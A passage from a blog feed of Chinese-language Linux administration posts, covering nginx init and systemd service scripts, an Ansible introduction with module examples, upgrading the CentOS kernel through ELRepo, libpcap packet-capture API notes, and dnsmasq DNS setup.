class="line">;;</span><br><span class="line">configtest|testconfig)</span><br><span class="line">log_daemon_msg &quot;Testing $DESC configuration&quot;</span><br><span class="line">test_config</span><br><span class="line">log_end_msg $?</span><br><span class="line">;;</span><br><span class="line">status)</span><br><span class="line">status_of_proc -p $PID &quot;$DAEMON&quot; &quot;$NAME&quot; &amp;&amp; exit 0 || exit $?</span><br><span class="line">;;</span><br><span class="line">upgrade)</span><br><span class="line">log_daemon_msg &quot;Upgrading binary&quot; &quot;$NAME&quot;</span><br><span class="line">upgrade_nginx</span><br><span class="line">log_end_msg $?</span><br><span class="line">;;</span><br><span class="line">rotate)</span><br><span class="line">log_daemon_msg &quot;Re-opening $DESC log files&quot; &quot;$NAME&quot;</span><br><span class="line">rotate_logs</span><br><span class="line">log_end_msg $?</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo &quot;Usage: $NAME &#123;start|stop|restart|reload|force-reload|status|configtest|rotate|upgrade&#125;&quot; &gt;&amp;2</span><br><span class="line">exit 3</span><br><span class="line">;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><p>使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rc-service sshd start</span><br><span class="line">service ssh start|status|stop|restart</span><br></pre></td></tr></table></figure><h3 id="2-systemd"><a href="#2-systemd" class="headerlink" title="2.systemd"></a>2.systemd</h3><p>systemd是大部分linux发行版采用的init程序,作为一种init程序,操作系统启动的时候systemd会启动一个后台守护进行systemd,systemd每启动一个服务,是通过从systemd fork一个子进程,启动服务的过程中systemd通过读取&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;**.service文件脚本,从而获得可执行程序的路径,启动程序参数等等…</p><p>以nginx.service服务管理脚本为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Stop dance <span class="keyword">for</span> nginx</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">=======================</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ExecStop sends SIGSTOP (graceful stop) to the nginx process.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">If, after 5s (--retry QUIT/5) nginx is still running, systemd takes control</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and sends SIGTERM (fast shutdown) to the main process.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">After another 5s (TimeoutStopSec=5), and <span class="keyword">if</span> nginx is alive, systemd sends</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SIGKILL to all the remaining processes <span class="keyword">in</span> the process group (KillMode=mixed).</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># nginx signals reference doc:</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://nginx.org/en/docs/control.html</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[Unit]</span></span><br><span class="line">Description=A high performance web server and a reverse proxy server</span><br><span class="line">Documentation=man:nginx(8)</span><br><span class="line">After=network.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进程</span></span><br><span class="line">PIDFile=/run/nginx.pid</span><br><span class="line">ExecStartPre=/usr/sbin/nginx -t -q -g &#x27;daemon on; master_process on;&#x27;</span><br><span class="line">ExecStart=/usr/sbin/nginx -g &#x27;daemon on; master_process on;&#x27;</span><br><span class="line">ExecReload=/usr/sbin/nginx -g &#x27;daemon on; master_process on;&#x27; -s reload</span><br><span class="line">ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid</span><br><span class="line">TimeoutStopSec=5</span><br><span class="line">KillMode=mixed</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>使用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start|stop|reload nginx.service #启动/停止服务</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置及原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ansible自动化运维入门</title>
      <link href="/2022/07/28/ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E5%85%A5%E9%97%A8/"/>
      <url>/2022/07/28/ansible%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="ansible自动化运维入门"><a href="#ansible自动化运维入门" class="headerlink" title="ansible自动化运维入门"></a>ansible自动化运维入门</h1><h4 id="1-ansible是什么"><a href="#1-ansible是什么" class="headerlink" title="1.ansible是什么?"></a>1.ansible是什么?</h4><p>Ansible是一个开源配置管理工具，可以使用它来自动化任务，部署应用程序实现IT基础架构。ansible基于python开发,提供了多种运维模块, Ansible可以用来自动化日常任务，比如，服务器的初始化配置、安全基线配置、更新和打补丁系统，安装软件包等，而且ansible配置十分简单,被控制机器只需要支持ssh登录即可被ansible进行管理，无需安装其他的agent,对于传统的运维方式，ansible大大提高了同时管理多台服务器的运维效率。</p><h4 id="2-ansible配置"><a href="#2-ansible配置" class="headerlink" title="2.ansible配置"></a>2.ansible配置</h4><p>基于ubuntu20.04(管理服务器)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ansible</span><br></pre></td></tr></table></figure><p>配置运维机器列表清单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ansible/hosts</span><br><span class="line">[mywebserver]</span><br><span class="line">192.168.0.5 ansible_user=root ansible_ssh_private_key_file=<span class="variable">$HOME</span>/.ssh/private_keys/armbian</span><br></pre></td></tr></table></figure><p>常用的配置参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ansible_connection <span class="comment">#主机连接类型，这可以是任何 ansible 连接插件的名称，如 smart、ssh、paramiko、local</span></span><br><span class="line">ansible_ssh_host <span class="comment"># 将要连接的远程主机名.与你想要设定的主机的别名不同的话,可通过此变量设置.</span></span><br><span class="line">ansible_ssh_port <span class="comment"># 连接端口号（默认22）</span></span><br><span class="line">ansible_ssh_user <span class="comment"># 连接主机时的用户名</span></span><br><span class="line">ansible_ssh_pass <span class="comment"># 用于验证主机的密码</span></span><br><span class="line">ansible_ssh_private_key_file <span class="comment"># ssh 使用的私钥文件.适用于有多个密钥,而你不想使用 SSH 代理的情况.</span></span><br><span class="line">ansible_ssh_common_args <span class="comment"># 此设置附加到 sftp，scp 和 ssh 的缺省命令行</span></span><br><span class="line">ansible_sftp_extra_args <span class="comment"># 此设置附加到默认 sftp 命令行</span></span><br><span class="line">ansible_scp_extra_args <span class="comment"># 此设置附加到默认 scp 命令行</span></span><br><span class="line">ansible_ssh_extra_args <span class="comment"># 此设置附加到默认 ssh 命令行</span></span><br><span class="line">ansible_ssh_pipelining <span class="comment"># 确定是否使用 SSH 管道。 这可以覆盖 ansible.cfg 中得设置</span></span><br><span class="line">ansible_shell_type <span class="comment"># 目标系统的 shell 类型，默认情况下命令的执行使用 &#x27;sh&#x27; 语法,可设置为 &#x27;csh&#x27; 或 &#x27;fish&#x27;</span></span><br><span class="line">ansible_python_interpreter <span class="comment"># 目标主机的 python 路径，适用于的情况: 系统中有多个 Python, 或者命令路径不是&quot;/usr/bin/python&quot;,比如 *BSD, 或者 /usr/bin/python</span></span><br><span class="line">ansible_interpreter <span class="comment"># 这里的&quot;&quot;可以是 ruby、perl 或其他语言的解释器，作用和ansible_python_interpreter 类似</span></span><br><span class="line">ansible_shell_executable <span class="comment"># 这将设置 ansible 控制器将在目标机器上使用的 shell，覆盖 ansible.cfg 中的配置，默认为 /bin/sh</span></span><br></pre></td></tr></table></figure><h4 id="3-实现远程服务器批量管理的模式"><a href="#3-实现远程服务器批量管理的模式" class="headerlink" title="3.实现远程服务器批量管理的模式"></a>3.实现远程服务器批量管理的模式</h4><h5 id="1-ad-hoc模式"><a href="#1-ad-hoc模式" class="headerlink" title="1.ad-hoc模式"></a>1.ad-hoc模式</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ansible-doc -s module_name<span class="comment">#查看该模块支持的参数</span></span><br><span class="line">ansible-doc -l <span class="comment">#查看可用的模块</span></span><br><span class="line"><span class="comment">#使用方法</span></span><br><span class="line">ansible SERVERLIST -m <span class="variable">$MODULE_NAME</span> -a <span class="variable">$ARGS</span></span><br></pre></td></tr></table></figure><h5 id="2-playbook模式"><a href="#2-playbook模式" class="headerlink" title="2.playbook模式"></a>2.playbook模式</h5><p>playbook模式是使用yaml文件格式将命令指定的参数以及目标类似于清单一样的描述下来</p><p>实例清单</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">hosts:</span> <span class="string">mycentos</span></span><br><span class="line">  <span class="attr">remote_user:</span> <span class="string">root</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">copyfile</span> <span class="string">to</span> <span class="string">des</span> <span class="string">server</span></span><br><span class="line">    <span class="attr">copy:</span> <span class="string">src=/root/shell.sh</span> <span class="string">dst=/tmp/shell.sh</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">tool</span></span><br><span class="line">    <span class="attr">yum:</span> <span class="string">name=nginx</span> <span class="string">state=restarted</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">service</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">name=nginx</span> <span class="string">state=started</span> <span class="string">enable=true</span></span><br><span class="line">  <span class="attr">handlers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">restart</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">name=nginx</span> <span class="string">state=restarted</span></span><br></pre></td></tr></table></figure><h4 id="4-ansible常用的模块"><a href="#4-ansible常用的模块" class="headerlink" title="4.ansible常用的模块"></a>4.ansible常用的模块</h4><p><strong>1.command模块</strong></p><p>向远程主机执行命令 (不支持管道符)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir 执行命令之前切换到指定目录</span><br><span class="line">creates 执行命令命令前判断文件是否存在,如果存在则不执行前面的命令</span><br><span class="line">removes 执行一个命令前判断指定的文件是否存在,如果存在执行前面的操作</span><br></pre></td></tr></table></figure><p><strong>2.shell模块</strong></p><p>shell模块基本和command相同，但是shell支持管道符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m shell -a <span class="string">&quot;/home/test.sh&quot;</span> <span class="comment">#在远程主机上执行远程主机的脚本(test.sh脚本在远程服务器)</span></span><br></pre></td></tr></table></figure><p><strong>3.script模块</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m script -a <span class="string">&quot;/home/test.sh&quot;</span> <span class="comment">#在远程主机上执行本地的脚本(test.sh脚本在主控端本地)</span></span><br></pre></td></tr></table></figure><p><strong>4.copy模块</strong></p><p>实现主控端向目标主机拷贝文件,类似于scp功能</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m copy -a <span class="string">&quot;src=/home/test.sh dst=/tmp/test.sh owner=root group=root mode=0755&quot;</span></span><br></pre></td></tr></table></figure><p><strong>5.stat模块</strong></p><p>获取远程文件的状态信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m <span class="built_in">stat</span> -a <span class="string">&quot;path=/etc/hosts&quot;</span></span><br></pre></td></tr></table></figure><p><strong>6.get_url</strong></p><p>实现远程主机下载指定url文件到远程主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m get_url <span class="string">&quot;url=https://www.baidu.com dst=/tmp/index.html mode=0444 force=yes&quot;</span></span><br></pre></td></tr></table></figure><p><strong>7.yum</strong></p><p>实现调用远程主机的yum包管理器下载指定的软件包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m yum -a <span class="string">&quot;name=kubernetes-master state=latest&quot;</span></span><br></pre></td></tr></table></figure><p><strong>8.crontab</strong></p><p>配置远程主机的计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m cron -a <span class="string">&quot;name=mywebserver  hour=&#x27;5,2&#x27; job=&#x27;ls -alh &gt; /dev/null&#x27;&quot;</span><span class="comment">#name为crontab中的注释</span></span><br></pre></td></tr></table></figure><p><strong>9.mount</strong></p><p>远程主机分区挂载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m mount -a <span class="string">&quot;name=/mnt/data src=/dev/sda1 fstype=ext4 opts=ro state=present&quot;</span></span><br></pre></td></tr></table></figure><p><strong>10.service</strong></p><p>对远程主机服务进行管理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m service -a <span class="string">&quot;name=nginx state=started|reloaded|stopped&quot;</span></span><br></pre></td></tr></table></figure><p><strong>11.user</strong></p><p>远程主机用户管理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible mywebserver -m user -a <span class="string">&quot;name=centos comment=&#x27;user&#x27;&quot;</span></span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://juejin.cn/post/6844903631066513421">https://juejin.cn/post/6844903631066513421</a></p>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置及软件原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos更换内核</title>
      <link href="/2022/07/12/centos%E6%9B%B4%E6%8D%A2%E5%86%85%E6%A0%B8/"/>
      <url>/2022/07/12/centos%E6%9B%B4%E6%8D%A2%E5%86%85%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="centos更换内核"><a href="#centos更换内核" class="headerlink" title="centos更换内核"></a>centos更换内核</h1><p>导入仓库索引密钥并下载仓库索引</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入仓库索引</span></span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line"><span class="comment">#安装软件包</span></span><br><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm</span><br></pre></td></tr></table></figure><p>查找可用的linux内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --disablerepo=<span class="string">&quot;*&quot;</span> --enablerepo=<span class="string">&quot;elrepo-kernel&quot;</span> list available</span><br></pre></td></tr></table></figure><p>安装最新版本的主线内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --enablerepo=elrepo-kernel install kernel-ml</span><br></pre></td></tr></table></figure><p>重新生成grub配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grub2-mkconfig -o /boot/grub2/grub.cfg</span><br></pre></td></tr></table></figure><p>设置默认的启动内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /boot/grub2/grub.cfg |grep menuentry<span class="comment">#查找可用的grub配置菜单参数</span></span><br><span class="line">grub2-set-default <span class="string">&#x27;CentOS Linux (4.17.4-1.el7.elrepo.x86_64) 7 (Core)&#x27;</span><span class="comment">#设置默认的启动内核版本</span></span><br></pre></td></tr></table></figure><p>参考:<a href="https://blog.csdn.net/qq_38591756/article/details/82829398">https://blog.csdn.net/qq_38591756/article/details/82829398</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件和系统配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libpcap的使用</title>
      <link href="/2022/07/08/libpcap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2022/07/08/libpcap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="libpcap的基本使用"><a href="#libpcap的基本使用" class="headerlink" title="libpcap的基本使用"></a>libpcap的基本使用</h1><h4 id="1-获取网络接口"><a href="#1-获取网络接口" class="headerlink" title="1.获取网络接口"></a>1.获取网络接口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">pcap_lookupdev</span><span class="params">(<span class="type">char</span> *error_buffer)</span>;<span class="comment">//获取本地网络接口(返回网络接口的名称)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pcap_findalldevs</span><span class="params">(<span class="type">pcap_if_t</span> **alldevsp, <span class="type">char</span> *errbuf)</span>;<span class="comment">//查找本地所有的网络接口</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> <span class="title">pcap_if_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_if</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">char</span> *name;<span class="comment">/* name to hand to &quot;pcap_open_live()&quot; */</span></span><br><span class="line"><span class="type">char</span> *description;<span class="comment">/* textual description of interface, or NULL */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_addr</span> *<span class="title">addresses</span>;</span></span><br><span class="line">bpf_u_int32 flags;<span class="comment">/* PCAP_IF_ interface flags */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_addr</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_addr</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">addr</span>;</span><span class="comment">/* address */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">netmask</span>;</span><span class="comment">/* netmask for that address */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">broadaddr</span>;</span><span class="comment">/* broadcast address for that address */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">dstaddr</span>;</span><span class="comment">/* P2P destination address for that address */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pcap_pkthdr</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">ts</span>;</span>    <span class="comment">/* time stamp */</span></span><br><span class="line">  bpf_u_int32 caplen;   <span class="comment">/* length of portion present */</span></span><br><span class="line">  bpf_u_int32 len;      <span class="comment">/* length this packet (off wire) */</span></span><br><span class="line">&#125;;<span class="comment">//抓到的包的结构</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">pcap_loop</span><span class="params">(handler,<span class="number">10</span>,capture_handler,<span class="literal">NULL</span>)</span>;</span><br><span class="line"><span class="type">char</span> *<span class="title function_">inet_ntoa</span><span class="params">(<span class="keyword">struct</span> in_addr *addr)</span>;<span class="comment">//该函数返回的指针指向的地址空间是静态分配的,因此每次调用此函数后,后面的结果都会对上一次的结果进行覆盖</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-打开一个网络接口"><a href="#2-打开一个网络接口" class="headerlink" title="2.打开一个网络接口"></a>2.打开一个网络接口</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pcap_t</span>*  <span class="title function_">pcap_open_live</span><span class="params">(<span class="type">char</span> *device,<span class="type">int</span> snaplen,<span class="type">int</span> packet_count_limit,<span class="type">int</span> timeout_limit,<span class="type">char</span> *error_buffer)</span>;<span class="comment">//打开一个网卡获得一个抓包句柄</span></span><br><span class="line"><span class="comment">//device </span></span><br><span class="line"><span class="comment">//snaplen   </span></span><br><span class="line"><span class="comment">//packet_count_limit 最大抓取的包的数量</span></span><br><span class="line"><span class="comment">//int timeout_limit  设置包从内核缓冲区拷贝到用户区所等待的时间</span></span><br></pre></td></tr></table></figure><h4 id="3-编译过滤条件"><a href="#3-编译过滤条件" class="headerlink" title="3.编译过滤条件"></a>3.编译过滤条件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pcap_compile</span><span class="params">(<span class="type">pcap_t</span> *handler, <span class="keyword">struct</span> bpf_program *fp, <span class="type">char</span> *<span class="built_in">exp</span>, <span class="type">int</span> optimize, bpf_u_int32 netmask)</span>;<span class="comment">//编一个过滤条件</span></span><br><span class="line"><span class="comment">//handler 打开的网卡句柄</span></span><br><span class="line"><span class="comment">//fp 存储过滤条件指针</span></span><br><span class="line"><span class="comment">//optimize 是否进行优化</span></span><br><span class="line"><span class="comment">//netmask 网络地址</span></span><br></pre></td></tr></table></figure><h4 id="4-设置过滤器"><a href="#4-设置过滤器" class="headerlink" title="4.设置过滤器"></a>4.设置过滤器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pcap_setfilter</span><span class="params">(<span class="type">pcap_t</span> *p, <span class="keyword">struct</span> bpf_program *fp)</span>;<span class="comment">//设置过滤器</span></span><br><span class="line"><span class="comment">//p 打开网卡的句柄</span></span><br><span class="line"><span class="comment">//fp设置的过滤表达式</span></span><br></pre></td></tr></table></figure><h4 id="5-获取包信息"><a href="#5-获取包信息" class="headerlink" title="5.获取包信息"></a>5.获取包信息</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">u_char *<span class="title function_">pcap_next</span><span class="params">(device,&amp;packet)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pcap_loop</span><span class="params">(<span class="type">pcap_t</span> *p, <span class="type">int</span> cnt,pcap_handler callback, u_char *user)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*pcap_handler)</span><span class="params">(u_char *user, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *h,<span class="type">const</span> u_char *bytes)</span>;</span><br><span class="line"><span class="comment">//获取一个数据包</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dnsmasq配置教程</title>
      <link href="/2022/07/08/dnsmasq%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
      <url>/2022/07/08/dnsmasq%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="dns服务器配置过程"><a href="#dns服务器配置过程" class="headerlink" title="dns服务器配置过程"></a>dns服务器配置过程</h1><h2 id="1-dnsmasq"><a href="#1-dnsmasq" class="headerlink" title="1.dnsmasq"></a>1.dnsmasq</h2><h3 id="1-1-安装dnsmasq"><a href="#1-1-安装dnsmasq" class="headerlink" title="1.1.安装dnsmasq"></a>1.1.安装dnsmasq</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#debian</span></span><br><span class="line">sudo apt install dnsmasq</span><br><span class="line"><span class="comment">#rhel</span></span><br><span class="line">sudo yum install -y dnsmasq</span><br></pre></td></tr></table></figure><h3 id="1-2-修改dnsmasq配置文件"><a href="#1-2-修改dnsmasq配置文件" class="headerlink" title="1.2.修改dnsmasq配置文件"></a>1.2.修改dnsmasq配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/dnsmasq.conf</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cache-size=10240<span class="comment">#dns缓存记录大小</span></span><br><span class="line">listen-address=192.168.0.5<span class="comment">#绑定的ip地址</span></span><br><span class="line">addn-hosts=/etc/dnsmasq.hosts<span class="comment">#导入外部的dns解析数据</span></span><br><span class="line">resolv-conf=/etc/dnsmasq.dnsmasq.conf<span class="comment">#指定上游dns服务器的文件</span></span><br></pre></td></tr></table></figure><h3 id="1-3-resolv-conf指定上游dns服务器可能不成功-未知原因"><a href="#1-3-resolv-conf指定上游dns服务器可能不成功-未知原因" class="headerlink" title="1.3.resolv-conf指定上游dns服务器可能不成功(未知原因)"></a>1.3.resolv-conf指定上游dns服务器可能不成功(未知原因)</h3><p>可以尝试修改&#x2F;etc&#x2F;init.d&#x2F;dnsmasq脚本</p><p>RESOLV-CONF&#x3D;&#x2F;etc&#x2F;resolv-dnsmasq.conf</p><h3 id="1-4-启动dns服务器"><a href="#1-4-启动dns服务器" class="headerlink" title="1.4.启动dns服务器"></a>1.4.启动dns服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start dnsmasq.service</span><br></pre></td></tr></table></figure><h2 id="2-bind"><a href="#2-bind" class="headerlink" title="2.bind"></a>2.bind</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
